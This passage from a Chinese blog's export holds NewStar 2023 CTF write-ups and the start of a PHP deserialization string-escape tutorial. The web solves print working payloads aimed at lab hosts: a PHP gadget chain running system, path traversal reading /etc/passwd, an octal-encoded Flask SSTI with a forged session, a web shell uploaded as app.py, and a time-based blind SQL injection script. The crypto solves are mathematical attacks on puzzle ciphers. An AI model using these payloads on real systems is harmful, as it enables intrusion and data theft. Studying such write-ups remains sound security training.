&#x2F;f*”;}}}}}\n\n去掉序列化尾部(去掉生成的序列化字符串最后的一个大括号)\nO:5:”Start”:1:{s:6:”errMsg”;O:6:”Crypto”:1:{s:3:”obj”;O:7:”Reverse”:1:{s:4:”func”;O:3:”Pwn”:1:{s:3:”obj”;O:3:”Web”:2:{s:4:”func”;s:6:”system”;s:3:”var”;s:7:”cat &#x2F;f*”;}}}}\n\n\n\n知识点：\n\nPHP中，如果单独执行unserialize函数进行常规的反序列化，那么被反序列化后的整个对象的生命周期就仅限于这个函数执行的生命周期，当这个函数执行完毕，这个类就没了，在有析构函数的情况下就会执行它。\n\nPHP中，如果用一个变量接住反序列化函数的返回值，那么被反序列化的对象其生命周期就会变长，由于它一直都存在于这个变量当中，那么在PHP脚本走完流程之后，这个对象才会被销毁，在有析构函数的情况下就会将其执行。\n\n\nInjectMe考点：目录穿越+session伪造+SSTI bypass\ndockerfile:\nFROM vulhub/flask:1.1.1ENV FLAG=flag&#123;not_here&#125;COPY src/ /appRUN mv /app/start.sh /start.sh &amp;&amp; chmod 777 /start.shCMD [ &quot;/start.sh&quot; ]EXPOSE 8080\n\n根据题目提示穿越我的秘密，狠狠地注入！以及打开题目点击图片，点到110.jpg发现 是python的flask框架\n\n猜测可能是目录穿越，由于写到将“..&#x2F;”替换成“”，于是构造..././..././..././..././etc/passwd–&gt;../../../../etc/passwd  或者 ....//....//....//....//etc/passwd\n下载文件得到：\nroot:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\n\n没有发现有用信息，接着找到dockerfile文件中存在app目录，于是猜测服务器运行代码app.py代码存在其中，访问下载 ....//....//....//....//app/app.py\nimport osimport refrom flask import Flask, render_template, request, abort, send_file, session, render_template_stringfrom config import secret_keyapp = Flask(__name__)app.secret_key = secret_key@app.route(&#x27;/&#x27;)def hello_world():  # put application&#x27;s code here    return render_template(&#x27;index.html&#x27;)@app.route(&quot;/cancanneed&quot;, methods=[&quot;GET&quot;])def cancanneed():    all_filename = os.listdir(&#x27;./static/img/&#x27;)    filename = request.args.get(&#x27;file&#x27;, &#x27;&#x27;)    if filename:        return render_template(&#x27;img.html&#x27;, filename=filename, all_filename=all_filename)    else:        return f&quot;&#123;str(os.listdir(&#x27;./static/img/&#x27;))&#125; &lt;br&gt; &lt;a href=\\&quot;/cancanneed?file=1.jpg\\&quot;&gt;/cancanneed?file=1.jpg&lt;/a&gt;&quot;@app.route(&quot;/download&quot;, methods=[&quot;GET&quot;])def download():    filename = request.args.get(&#x27;file&#x27;, &#x27;&#x27;)    if filename:        filename = filename.replace(&#x27;../&#x27;, &#x27;&#x27;)        filename = os.path.join(&#x27;static/img/&#x27;, filename)        print(filename)        if (os.path.exists(filename)) and (&quot;start&quot; not in filename):            return send_file(filename)        else:            abort(500)    else:        abort(404)@app.route(&#x27;/backdoor&#x27;, methods=[&quot;GET&quot;])def backdoor():    try:        print(session.get(&quot;user&quot;))        if session.get(&quot;user&quot;) is None:            session[&#x27;user&#x27;] = &quot;guest&quot;        name = session.get(&quot;user&quot;)        if re.findall(                r&#x27;__|&#123;&#123;|class|base|init|mro|subclasses|builtins|globals|flag|os|system|popen|eval|:|\\+|request|cat|tac|base64|nl|hex|\\\\u|\\\\x|\\.&#x27;,                name):            abort(500)        else:            return render_template_string(                &#x27;竟然给&lt;h1&gt;%s&lt;/h1&gt;你找到了我的后门，你一定是网络安全大赛冠军吧！😝 &lt;br&gt; 那么 现在轮到你了!&lt;br&gt; 最后祝您玩得愉快!😁&#x27; % name)    except Exception:        abort(500)@app.errorhandler(404)def page_not_find(e):    return render_template(&#x27;404.html&#x27;), 404@app.errorhandler(500)def internal_server_error(e):    return render_template(&#x27;500.html&#x27;), 500if __name__ == &#x27;__main__&#x27;:    app.run(&#x27;0.0.0.0&#x27;, port=8080)\n\n审计源码发现：from config import secret_key 以及@app.route(&#39;/backdoor&#39;, methods=[&quot;GET&quot;])\n\nfrom config import secret_key，首先根据此猜测可能存在config.py文件，其中存在secret_key\n\n于是访问下载....//....//....//....//app/config.py\n得到：secret_key = &quot;y0u_n3ver_k0nw_s3cret_key_1s_newst4r&quot;\n\n伪造seesion，进行模板注入，有关键字过滤，可以使用八进制绕过\n\n官方脚本更改相关信息：\nimport reimport requestsimport subprocess# 把这个下载了，需要使用里面的flask-session-cookie-manager3.py# https://github.com/noraj/flask-session-cookie-managerdef string_to_octal_ascii(s):    octal_ascii = &quot;&quot;    for char in s:        char_code = ord(char)        octal_ascii += &quot;\\\\\\\\&quot; + format(char_code, &#x27;03o&#x27;)    # octal_ascii += &quot;\\\\\\\\&quot; + format(char_code, &#x27;o&#x27;)    return octal_asciisecret_key = &quot;y0u_n3ver_k0nw_s3cret_key_1s_newst4r&quot;# payload = &quot;&#123;%print(7*7)%&#125;&quot;# payload = &quot;&#123;%print(\\&quot;\\&quot;\\\\\\\\u005f\\\\\\\\u005f\\&quot;\\&quot;)%&#125;&quot;# payload = &quot;&#123;%print(\\&quot;\\&quot;\\\\\\\\x5f\\\\\\\\x5f\\&quot;\\&quot;)%&#125;&quot;eval_shell = &quot;\\&quot;\\&quot;&quot; + string_to_octal_ascii(&quot;__import__(\\&quot;os\\&quot;).popen(\\&quot;cat /*\\&quot;).read()&quot;) + &quot;\\&quot;\\&quot;&quot;print(eval_shell)# docker部署&amp;windows运行payload# &#123;&#123;x.__init__.__globals__.__builtins__.eval(&#x27;__import__(&quot;os&quot;).popen(&quot;dir&quot;).read()&#x27;)&#125;&#125;payload = &quot;&#123;&#123;%print(xxx|attr(\\&quot;\\&quot;\\\\\\\\137\\\\\\\\137\\\\\\\\151\\\\\\\\156\\\\\\\\151\\\\\\\\164\\\\\\\\137\\\\\\\\137\\&quot;\\&quot;)|attr(\\&quot;\\&quot;\\\\\\\\137\\\\\\\\137\\\\\\\\147\\\\\\\\154\\\\\\\\157\\\\\\\\142\\\\\\\\141\\\\\\\\154\\\\\\\\163\\\\\\\\137\\\\\\\\137\\&quot;\\&quot;)|attr(\\&quot;\\&quot;\\\\\\\\137\\\\\\\\137\\\\\\\\147\\\\\\\\145\\\\\\\\164\\\\\\\\151\\\\\\\\164\\\\\\\\145\\\\\\\\155\\\\\\\\137\\\\\\\\137\\&quot;\\&quot;)(\\&quot;\\&quot;\\\\\\\\137\\\\\\\\137\\\\\\\\142\\\\\\\\165\\\\\\\\151\\\\\\\\154\\\\\\\\164\\\\\\\\151\\\\\\\\156\\\\\\\\163\\\\\\\\137\\\\\\\\137\\&quot;\\&quot;)|attr(\\&quot;\\&quot;\\\\\\\\137\\\\\\\\137\\\\\\\\147\\\\\\\\145\\\\\\\\164\\\\\\\\151\\\\\\\\164\\\\\\\\145\\\\\\\\155\\\\\\\\137\\\\\\\\137\\&quot;\\&quot;)(\\&quot;\\&quot;\\\\\\\\145\\\\\\\\166\\\\\\\\141\\\\\\\\154\\&quot;\\&quot;)(&#123;0&#125;))%&#125;&#125;&quot;.format(eval_shell)print(payload)command = &quot;D:\\\\program\\\\python3\\\\python.exe flask_session_cookie_manager3.py encode -s \\&quot;&#123;0&#125;\\&quot; -t \\&quot;&#123;&#123;&#x27;user&#x27;:&#x27;&#123;1&#125;&#x27;&#125;&#125;\\&quot;&quot;.format(secret_key, payload)print(command)session_data = subprocess.check_output(command, shell=True)print(session_data)# linux和windows换行不一样，linux是去掉最后一个，windows是最后两个。session_data = session_data[:-2].decode(&#x27;utf-8&#x27;)# session_data = session_data[:-1].decode(&#x27;utf-8&#x27;)print(session_data)url = &quot;http://0b401771-d36b-47ca-8971-2b9dedf4b9e0.node4.buuoj.cn:81/backdoor&quot;cookies = &#123;&quot;session&quot;: session_data&#125;res = requests.get(url=url, cookies=cookies)# print(res.text)pattern = r&#x27;&lt;h1&gt;(.*)&lt;/h1&gt;&#x27;result_content = re.search(pattern, res.text, re.S)# print(result_content)if result_content:    result = result_content.group(1)    print(result)else:    print(&quot;something wrong!&quot;)\n\nflask disk点开题目出现 list file、upload files、admin manage\n依次点击，到admin manage出现\n\n这能得到是python flask框架，说明flask开启了debug模式，在debug模式下app.py源文件被修改后会立刻加载，只需上传一个能rce的app.py文件把原来的覆盖\nfrom flask import Flask,requestimport osapp = Flask(__name__)@app.route(&#x27;/&#x27;)def index():    try:        cmd = request.args.get(&#x27;cmd&#x27;)        date = os.popen(cmd).read()        return date    except:        pass    return &quot;1&quot;if __name__ == &#x27;__main__&#x27;:    app.run(host=&#x27;0.0.0.0&#x27;,port=5000,debug=True)\n\n\n\n\nfrom flask import Flask, request：导入了Flask框架以及request模块，用于创建Web应用程序和处理HTTP请求。\nimport os：导入了Python的os模块，用于执行操作系统命令。\napp &#x3D; Flask(_name_)：创建一个Flask应用程序实例。\n@app.route(‘&#x2F;‘)：定义了一个路由，当用户访问根路径(‘&#x2F;‘)时，将执行下面的index函数。\ndef index()：定义了一个名为index的函数，用于处理用户的HTTP请求。\ncmd &#x3D; request.args.get(‘cmd’)：从HTTP请求的查询参数中获取名为’cmd’的参数的值，该值应该包含一个要执行的操作系统命令。\ndate &#x3D; os.popen(cmd).read()：使用os.popen执行获取到的命令，并将执行结果存储在date变量中。\nreturn date：将命令执行结果返回给客户端，这意味着如果用户提供了合法的操作系统命令，服务器将执行该命令并返回结果。return “1”：如果没有提供’cmd’参数或发生异常，服务器将返回字符串”1”。\n\n接着访问：http://f003e914-33c2-4635-9170-1b7cb9c5f4a8.node4.buuoj.cn:81/?cmd=ls%20/\nhttp://f003e914-33c2-4635-9170-1b7cb9c5f4a8.node4.buuoj.cn:81/?cmd=cat%20/flag\nmidsql考察sql时间盲注，过滤了空格，无回显\nimport timeimport requestsresult = &#x27;&#x27;last = &#x27; &#x27;for i in range(1, 1000):    for j in range(127, 31, -1):        url = &#x27;http://3498ba56-0b4f-4a64-b19a-4ef45047e7df.node4.buuoj.cn:81/?id=&#x27;        # payload = f&#x27;1/**/and/**/if((ascii(substr((select/**/group_concat(schema_name)/**/from/**/information_schema.schemata),&#123;i&#125;,1))&gt;&#123;j&#125;),sleep(3),0)&#x27; # information_schema,mysql,performance_schema,sys,test,ctf        # payload = f&#x27;1/**/and/**/if((ascii(substr((select/**/database()),&#123;i&#125;,1))&gt;&#123;j&#125;),sleep(3),0)&#x27;        # payload = f&#x27;1/**/and/**/if((ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema/**/like/**/&quot;ctf&quot;),&#123;i&#125;,1))&gt;&#123;j&#125;),sleep(3),0)&#x27;        # payload = f&#x27;1/**/and/**/if((ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name/**/like/**/&quot;items&quot;),&#123;i&#125;,1))&gt;&#123;j&#125;),sleep(3),0)&#x27; # id,name,price        # payload = f&#x27;1/**/and/**/if((ascii(substr((select/**/group_concat(price)/**/from/**/ctf.items),&#123;i&#125;,1))&gt;&#123;j&#125;),sleep(3),0)&#x27;        # payload = f&#x27;1/**/and/**/if((ascii(substr((select/**/group_concat(id,0x3a,name,0x3a,price)/**/from/**/ctf.items),&#123;i&#125;,1))&gt;&#123;j&#125;),sleep(3),0)&#x27;        payload = f&#x27;1/**/and/**/if((ascii(substr((select/**/group_concat(name)/**/from/**/ctf.items),&#123;i&#125;,1))&gt;&#123;j&#125;),sleep(4),0)&#x27;        url = url + payload        # print(url)        start_time = time.time()        response = requests.get(url=url)        end_time = time.time()        if (end_time - start_time) &gt;3:            last = result            result += chr(j + 1)            break    print(result)\n\n\n\ncryptoRSA Variation II题目：\nfrom secret import flagfrom Crypto.Util.number import *p = getPrime(1024)q = getPrime(1024)N = p*p*qd= inverse(N, (p-1)*(q-1)//GCD(p-1, q-1))m = bytes_to_long(flag)c = pow(m, N, N)print(&#x27;c =&#x27;, c)print(&#x27;N =&#x27;, N)print(&#x27;d =&#x27;, d)# c = 1653396627113549535760516503668455111392369905404419847336187180051939350514408518095369852411718553340156505246372037811032919080426885042549723125598742783778413642221563616358386699697645814225855089454045984443096447166740882693228043505960011332616740785976743150624114653594631779427044055729185392854961786323215146318588164139423925400772680226861699990332420246447180631417523181196631188540323779487858453719444807515638025771586275969579201806909799448813112034867089866513864971414742370516244653259347267231436131850871346106316007958256749016599758599549180907260093080500469394473142003147643172770078092713912200110043214435078277125844112816260967490086038358669788006182833272351526796228536135638071670829206746835346784997437044707950580087067666459222916040902038574157577881880027391425763503693184264104932693985833980182986816664377018507487697769866530103927375926578569947076633923873193100147751463# N = 1768427447158131856514034889456397424027937796617829756303525705316152314769129050888899742667986532346611229157207778487065194513722005516611969754197481310330149721054855689646133721600838194741123290410384315980339516947257172981002480414254023253269098539962527834174781356657779988761754582343096332391763560921491414520707112852896782970123018263505426447126195645371941116395659369152654368118569516482251442513192892626222576419747048343942947570016045016127917578272819812760632788343321742583353340158009324794626006731057267603803701663256706597904789047060978427573361035171008822467120148227698893238773305320215769410594974360573727150122036666987718934166622785421464647946084162895084248352643721808444370307254417501852264572985908550839933862563001186477021313236113690793843893640190378131373214104044465633483953616402680853776480712599669132572907096151664916118185486737463253559093537311036517461749439# d = 20650646933118544225095544552373007455928574480175801658168105227037950105642248948645762488881219576174131624593293487325329703919313156659700002234392400636474610143032745113473842675857323774566945229148664969659797779146488402588937762391470971617163496433008501858907585683428652637958844902909796849080799141999490231877378863244093900363251415972834146031490928923962271054053278056347181254936750536280638321211545167520935870220829786490686826062142415755063724639110568511969041175019898031990455911525941036727091961083201123910761290998968240338217895275414072475701909497518616112236380389851984377079\n\n根据题目提示Schmidt-Samoa密码\n\nSchmidt-Samoa密码系统\n\nSchmidt-Samoa密码系统，像rabin加密一样，其安全性基于整数因式分解的难度。但 Rabin 解密时会得到四个解，而 Schmidt-Samor 得到的是唯一解。\n\n密钥生成\n\n​       1.选取两个大的质数p和q并进行计算 N &#x3D; p^2^q \n​       2.计算 d &#x3D; invert (N , φ (pq)) \n\n加密\n\n对消息m，计算密文 C &#x3D; m^N^  mod N\n\n解密\n\n计算明文 m &#x3D; C^d^  mod  pq\n举例：\n\n\np&#x3D;7, q&#x3D;11,  N&#x3D;p^2^q&#x3D;539 ,  d &#x3D; N ^-1^ mod  lcm ( p − 1 , q − 1 ) &#x3D; 29 \nm &#x3D; 32 ,  c &#x3D; m^N^ mod N &#x3D; 373\n\n\n验证：\n\nm&#x3D;c^d^  mod pq &#x3D; 373 ^29^ mod pq &#x3D; 373^29^ mod 77 &#x3D; 32\n\n关于获取pq的问题\n由 N &#x3D; p ^2^ ∗ q , d * N &#x3D; 1 mod (q-1) (p-1)通过欧拉定理可以得到：\n\na ^(p1-)(q-1)^ ≡ 1 mod pq\n\n所以：\n\na^N^ ∗ d &#x3D; a^1+k∗(q−1)(p−1)^ ≡ a∗a^k∗(q−1)(p−1)^&#x3D;a  mod pq \n\n所以：\n\nk ∗ pq&#x3D;a^N∗d^ − apq &#x3D;  gcd(a^N*d^ - a,N)因为a的取值可以是 a &#x3D; 2,3,4,5…，这里方便计算我们取 2\n\n解密exp:\nfrom libnum import*N =  1768427447158131856514034889456397424027937796617829756303525705316152314769129050888899742667986532346611229157207778487065194513722005516611969754197481310330149721054855689646133721600838194741123290410384315980339516947257172981002480414254023253269098539962527834174781356657779988761754582343096332391763560921491414520707112852896782970123018263505426447126195645371941116395659369152654368118569516482251442513192892626222576419747048343942947570016045016127917578272819812760632788343321742583353340158009324794626006731057267603803701663256706597904789047060978427573361035171008822467120148227698893238773305320215769410594974360573727150122036666987718934166622785421464647946084162895084248352643721808444370307254417501852264572985908550839933862563001186477021313236113690793843893640190378131373214104044465633483953616402680853776480712599669132572907096151664916118185486737463253559093537311036517461749439#N = p^2*qd = 20650646933118544225095544552373007455928574480175801658168105227037950105642248948645762488881219576174131624593293487325329703919313156659700002234392400636474610143032745113473842675857323774566945229148664969659797779146488402588937762391470971617163496433008501858907585683428652637958844902909796849080799141999490231877378863244093900363251415972834146031490928923962271054053278056347181254936750536280638321211545167520935870220829786490686826062142415755063724639110568511969041175019898031990455911525941036727091961083201123910761290998968240338217895275414072475701909497518616112236380389851984377079c = 1653396627113549535760516503668455111392369905404419847336187180051939350514408518095369852411718553340156505246372037811032919080426885042549723125598742783778413642221563616358386699697645814225855089454045984443096447166740882693228043505960011332616740785976743150624114653594631779427044055729185392854961786323215146318588164139423925400772680226861699990332420246447180631417523181196631188540323779487858453719444807515638025771586275969579201806909799448813112034867089866513864971414742370516244653259347267231436131850871346106316007958256749016599758599549180907260093080500469394473142003147643172770078092713912200110043214435078277125844112816260967490086038358669788006182833272351526796228536135638071670829206746835346784997437044707950580087067666459222916040902038574157577881880027391425763503693184264104932693985833980182986816664377018507487697769866530103927375926578569947076633923873193100147751463pq = gcd(pow(2,d*N,N)-2,N)m = pow(c,d,pq)print(n2s(m))\n\nsignin[官方解]\n考点： p-1光滑，多次rabin ：\n\nFLAG：flag{new1sstar_welcome_you}\n\n解题步骤\n\n\ndef uniPrime(bits):        while True:                n = 2                while n.bit_length() &lt; bits:                        n *= choice(sieve_base)                if isPrime(n + 1):                        return n + 1\n\n阅读代码可知p-1光滑,可以用如下方式分解\n\n再来看e,e&#x3D;65536*3\n可以看作 2*163，那么对rabin解密后的结果再次rabin，共16次rabin解密\n代码如下：\nfrom Crypto.Util.number import *N= 3326716005321175474866311915397401254111950808705576293932345690533263108414883877530294339294274914837424580618375346509555627578734883357652996005817766370804842161603027636393776079113035745495508839749006773483720698066943577445977551268093247748313691392265332970992500440422951173889419377779135952537088733c= 2709336316075650177079376244796188132561250459751152184677022745551914544884517324887652368450635995644019212878543745475885906864265559139379903049221765159852922264140740839538366147411533242116915892792672736321879694956051586399594206293685750573633107354109784921229088063124404073840557026747056910514218246import gmpy2a = 2n = 2while True:    a = pow(a, n, N)    res = gmpy2.gcd(a-1, N)    if res != 1 and res != N:        q = N // res        p = res        break    n += 1print(2**16)e=65536*3n = p*qx0=gmpy2.invert(p,q)x1=gmpy2.invert(q,p)cs = [c]for i in range(16):    ps = []    for c2 in cs:        r = pow(c2, (p + 1) // 4, p)        s = pow(c2, (q + 1) // 4, q)        x = (r * x1 * q + s * x0 * p) % n        y = (r * x1 * q - s * x0 * p) % n        if x not in ps:            ps.append(x)        if n - x not in ps:            ps.append(n - x)        if y not in ps:            ps.append(y)        if n - y not in ps:            ps.append(n - y)    cs = psfor m in ps:    flag = long_to_bytes(gmpy2.iroot(m,3)[0])    print(flag)\n\n\n\n\n官方WriteUp：https://shimo.im/docs/gXqmdVvbOEsXpo3o/read\n\nBabyNRTU[官方解]\n考点：NTRU 格攻击在二维的情形\n\nFLAG：flag{Lattice_reduction_magic_on_NTRU#82b08b2d}\n\n解题步骤\n\n\nfrom Crypto.Util.number import long_to_bytes# h,q = (8916452722821418463248726825721257021744194286874706915832444631771596616116491775091473142798867278598586482678387668986764461265131119164500473719939894343163496325556340181429675937641495981353857724627081847304246987074303722642172988864138967404024201246050387152854001746763104417773214408906879366958729744259612777257542351501592019483745621824894790096639205771421560295175633152877667720038396154571697861326821483170835238092879747297506606983322890706220824261581533324824858599082611886026668788577757970984892292609271082176311433507931993672945925883985629311514143607457603297458439759594085898425992, 31985842636498685945330905726539498901443694955736332073639744466389039373143618920511122288844282849407290205804991634167816417468703459229138891348115191921395278336695684210437130681337971686008048054340499654721317721241239990701099685207253476642931586563363638141636011941268962999641130263828151538489139254625099330199557503153680089387538863574480134898211311252227463870838947777479309928195791241005127445821671684607237706849308372923372795573732000365072815112119533702614620325238183899266147682193892866330678076925199674554569018103164228278742151778832319406135513140669049734660019551179692615505961)# e = 20041713613876382007969284056698149007154248857420752520496829246324512197188211029665990713599667984019715503486507126224558092176392282486689347953069815123212779090783909545244160318938357529307482025697769394114967028564546355310883670462197528011181768588878447856875173263800885048676190978206851268887445527785387532167370943745180538168965461612097037041570912365648125449804109299630958840398397721916860876687808474004391843869813396858468730877627733234832744328768443830669469345926766882446378765847334421595034470639171397587395341977453536859946410431252287203312913117023084978959318406160721042580688&quot;&quot;&quot;from sage.all import *from Crypto.Util.number import long_to_bytesh, q = (8916452722821418463248726825721257021744194286874706915832444631771596616116491775091473142798867278598586482678387668986764461265131119164500473719939894343163496325556340181429675937641495981353857724627081847304246987074303722642172988864138967404024201246050387152854001746763104417773214408906879366958729744259612777257542351501592019483745621824894790096639205771421560295175633152877667720038396154571697861326821483170835238092879747297506606983322890706220824261581533324824858599082611886026668788577757970984892292609271082176311433507931993672945925883985629311514143607457603297458439759594085898425992, 31985842636498685945330905726539498901443694955736332073639744466389039373143618920511122288844282849407290205804991634167816417468703459229138891348115191921395278336695684210437130681337971686008048054340499654721317721241239990701099685207253476642931586563363638141636011941268962999641130263828151538489139254625099330199557503153680089387538863574480134898211311252227463870838947777479309928195791241005127445821671684607237706849308372923372795573732000365072815112119533702614620325238183899266147682193892866330678076925199674554569018103164228278742151778832319406135513140669049734660019551179692615505961)e = 20041713613876382007969284056698149007154248857420752520496829246324512197188211029665990713599667984019715503486507126224558092176392282486689347953069815123212779090783909545244160318938357529307482025697769394114967028564546355310883670462197528011181768588878447856875173263800885048676190978206851268887445527785387532167370943745180538168965461612097037041570912365648125449804109299630958840398397721916860876687808474004391843869813396858468730877627733234832744328768443830669469345926766882446378765847334421595034470639171397587395341977453536859946410431252287203312913117023084978959318406160721042580688M = Matrix(ZZ, [            [1, h],            [0, q]])for v in M.LLL():    f, g = v    a = e*f % q    m = a * inverse_mod(f, g) % g    if b&#x27;flag&#x27; in long_to_bytes(m):        print(long_to_bytes(m)&quot;&quot;&quot;m = 240545625414656445795697416299836828697587638044418742943136404284040669983557024929358783705357829768985339005print(long_to_bytes(m))\n\nSmart[官方解]\n考点：ECC Smart attack（椭圆曲线trace of Frobenius &#x3D; 1的情形）\n\nFLAG：flag{m1nd_y0ur_p4rameter#167d}\n\n解题步骤.\n\n\n&quot;&quot;&quot;考点：ECC Smart attack（椭圆曲线trace of Frobenius = 1的情形）FLAG：flag&#123;m1nd_y0ur_p4rameter#167d&#125;# 解题步骤&quot;&quot;&quot;from Crypto.Util.number import *from sage.all import *def lift_point(E, P):    R = P.base_ring()    x, y = map(ZZ, P.xy())    PP = E.lift_x(x, all=True)    for pt in PP:        _, yy = map(R, pt.xy())        if y == yy:            return ptp = 75206427479775622966537995406541077245842499523456803092204668034148875719001a = 40399280641537685263236367744605671534251002649301968428998107181223348036480b = 34830673418515139976377184302022321848201537906033092355749226925568830384464E = EllipticCurve(GF(p), [a, b])G = E(63199291976729017585116731422181573663076311513240158412108878460234764025898, 11977959928854309700611217102917186587242105343137383979364679606977824228558)P = E(75017275378438543246214954287362349176908042127439117734318700769768512624429, 39521483276009738115474714281626894361123804837783117725653243818498259351984)EE = E = EllipticCurve(Qp(p), [int(a) + p * ZZ.random_element(1, p) for a in E.a_invariants()])x, y = map(ZZ, P.xy())GG = lift_point(EE, G)PP = lift_point(EE, P)Gp = p * GGPp = p * PPGx, Gy = Gp.xy()Px, Py = Pp.xy()d = ZZ((Px / Py) / (Gx / Gy)) % p# d = 706900059475062772067312229965334421909675651947459433421022963709731965print(long_to_bytes(d))\n\nerror[官方解]\n考点 lwe\n\nFLAG：flag{try_lear1n_wi0h_t1e_error}\n\n解题步骤\n\n\n&quot;&quot;&quot;考点 lweFLAG：flag&#123;try_lear1n_wi0h_t1e_error&#125;解题步骤&quot;&quot;&quot;import res2n=lambda x: [int(x) for x in re.findall(r&quot;\\-?\\d+\\.?\\d*&quot;,x)]f=open(&quot;./enc.out&quot;,&quot;r&quot;).readlines()m = 66n = 200p = 5q = 2^20B = [s2n(f[i]) for i in range(m)]A = [s2n(f[i+66]) for i in range(m)]C = [s2n(f[i+132]) for i in range(m)]# print(A)# print(B)# print(C)b= list(matrix(ZZ,s2n(f[-1])))m=A+B+C+bM = matrix(ZZ,m)L = M.LLL()print(L[0])res=M.solve_left(L[0])for i in res[:-1]:    print(chr(abs(i)),end=&quot;&quot;)\n\n\n官方WriteUp：https://shimo.im/docs/gXqmdVvbOEsXpo3o/\n\n","categories":["CTF","NewStar 2023"],"tags":["ctf","crypto","web"]},{"title":"PHP序列化字符逃逸","url":"/PHP%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8/","content":"反序列化字符逃逸此类题目的本质就是改变序列化字符串的长度，导致反序列化漏洞这种题目有个共同点：\n\nphp序列化后的字符串经过了替换或者修改，导致字符串长度发生变化。\n总是先进行序列化，再进行替换修改操作。\n\n&lt;?phpfunction filter($str)&#123;    return str_replace(&#x27;bb&#x27;, &#x27;ccc&#x27;, $str);&#125;class A&#123;    public $name=&#x27;aaaa&#x27;;    public $pass=&#x27;123456&#x27;;&#125;$AA=new A();// echo serialize($AA).&quot;\\n&quot;;$res=filter(serialize($AA));$c=unserialize($res);echo $c-&gt;pass;?&gt;\n\n以上面代码为例，如何在不直接修改$pass值的情况下间接修改$pass的值。这段代码的流程是，先序列化代码，然后将里面不希望出现的字符bb替换成自定义的字符串ccc。然后进行反序列化，最后输出pass变量。\n要解决上面这个问题，先来看一下php序列化代码的特征。\nO:1:”A”:2:{s:4:”name”;s:4:”aaaa”;s:4:”pass”;s:6:”123456”;}\n我们可以看到，反序列化字符串都是以&quot;;&#125;结束的，所以如果我们把&quot;;&#125;带入需要反序列化的字符串中（除了结尾处），就能让反序列化提前闭合结束，后面的内容就丢弃了。在反序列化的时候php会根据s所指定的字符长度去读取后边的字符。如果指定的长度s错误则反序列化就会失败。\n根据刚才讲的，如果我们将name变量中添加bb则程序就会报错，因为bb将被filter函数替换成ccc，ccc的长度比bb多1，这样前面的s所代表的长度为2但是内容却变长了，成了ccc。\n&lt;?phpfunction filter($str)&#123;    return str_replace(&#x27;bb&#x27;, &#x27;ccc&#x27;, $str);&#125;class A&#123;    public $name=&#x27;aaaabb&#x27;;    public $pass=&#x27;123456&#x27;;&#125;$AA=new A();// echo serialize($AA).&quot;\\n&quot;;$res=filter(serialize($AA));echo serialize($AA).&quot;\\n&quot;;$res = filter(serialize($AA));echo $res;$c=unserialize($res);echo $c-&gt;pass;?&gt;\n\n\n\nO:1:”A”:2:{s:4:”name”;s:6:”aaaabb”;s:4:”pass”;s:6:”123456”;}\nO:1:”A”:2:{s:4:”name”;s:6:”aaaaccc”;s:4:”pass”;s:6:”123456”;}\n可见在序列化后的字符串在经过filter函数过滤前，s为6，内容为aaaabb；经过filter过滤后，s仍然为6，但内容变为了aaaaccc，长度变成了7，根据反序列化读取变量的原则来讲，此时的name能读取到的只是aaaacc，末尾处的那个c是读取不到的，这就形成了一个字符串的逃逸。当我们添加多个bb，每添加一个bb我们就能逃逸一个字符，那我们将逃逸的字符串的长度填充成我们要反序列化的代码长度的话那就可以控制反序列化的结果以及类里面的变量值了。\n假如在name处改为：&quot;;s:4:&quot;pass&quot;;s:6:&quot;hacker&quot;;&#125;\n&lt;?phpfunction filter($str)&#123;    return str_replace(&#x27;bb&#x27;, &#x27;ccc&#x27;, $str);&#125;class A&#123;    public $name=&#x27;&quot;;s:4:&quot;pass&quot;;s:6:&quot;hacker&quot;;&#125;&#x27;;    public $pass=&#x27;123456&#x27;;&#125;$AA=new A();echo serialize($AA).&quot;\\n&quot;;$res = filter(serialize($AA));echo $res;$c=unserialize($res);echo $c-&gt;pass;?&gt;\n\n由于$name被序列化后的长度是固定的，在反序列化后$name仍然为&quot;;s:4:&quot;pass&quot;;s:6:&quot;hacker&quot;;&#125;，$pass仍然为123456：\nO:1:”A”:2:{s:4:”name”;s:27:&quot;&quot;;s:4:&quot;pass&quot;;s:6:&quot;hacker&quot;;&#125;&quot;;s:4:”pass”;s:6:”123456”;}\n关键点在于filter函数，这个函数检测并替换了非法字符串，看似增加了代码的安全系数，实则让整段代码更加危险。filter函数中检测序列化后的字符串，如果检测到了非法字符’bb’，就把它替换为’ccc’。此时我们发现”;s:4:”pass”;s:6:”hacker”;}的长度为27，如果我们再加上27个bb，那最终的长度将增加27，不就能逃逸后面的”;s:4:”pass”;s:6:”hacker”;}了吗？如下：\n&lt;?phpfunction filter($str)&#123;    return str_replace(&#x27;bb&#x27;, &#x27;ccc&#x27;, $str);&#125;class A&#123;    public $name=&#x27;bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&quot;;s:4:&quot;pass&quot;;s:6:&quot;hacker&quot;;&#125;&#x27;;    public $pass=&#x27;123456&#x27;;&#125;$AA=new A();echo serialize($AA).&quot;\\n&quot;;$res = filter(serialize($AA));echo $res.&quot;\\n&quot;;$c=unserialize($res);print_r($c).&quot;\\n&quot;;echo 